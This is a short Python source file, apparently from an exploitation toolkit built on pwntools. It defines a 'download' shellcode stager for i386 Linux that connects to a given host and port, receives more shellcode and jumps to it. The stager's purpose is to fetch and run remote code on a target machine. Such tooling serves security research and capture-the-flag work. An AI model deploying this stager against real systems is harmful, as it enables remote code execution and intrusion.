from pwn import *
#from recv import recv
from connect import connect

@shellcode_reqs(arch='i386', os='linux', network='ipv4')
def download(host, port):
    """Args: host, port
    Download shellcode from host on port, and run it."""
    return \
        connect(host, port) + \
        recv() + \
        'jmp esp'
